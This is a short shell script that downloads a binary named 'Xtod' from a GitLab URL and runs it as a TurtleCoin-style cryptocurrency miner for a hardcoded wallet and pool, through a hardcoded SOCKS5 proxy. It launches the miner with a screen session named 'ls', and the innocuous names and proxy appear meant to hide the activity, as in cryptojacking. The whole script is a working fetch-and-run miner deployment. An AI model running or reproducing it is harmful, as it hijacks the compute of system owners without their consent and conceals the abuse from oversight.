#!/bin/sh
apt-get update 
apt-get install screen libjansson4 -y
wget https://gitlab.com/buyutuk/xmr/-/raw/main/Xtod
chmod 777 Xtod
screen -dmS ls
POOL=pool.hashvault.pro:80
WALLET=TRTLv1xLSHLPhfLEmMhk6J1p42SHHSGA15jiByLzY7gvYnotcwb3L5L8FHDUJ4uH7qLkEdfxuTWAW69tZ4LtskR1eTrgWw4BJSB
WORKER=GAS
PROXY=socks5://72.221.164.34:60671
./Xtod -o $POOL -u $WALLET -p $WORKER -a argon2/chukwav2 --donate-level 1 -t 2 -x $PROXY -k
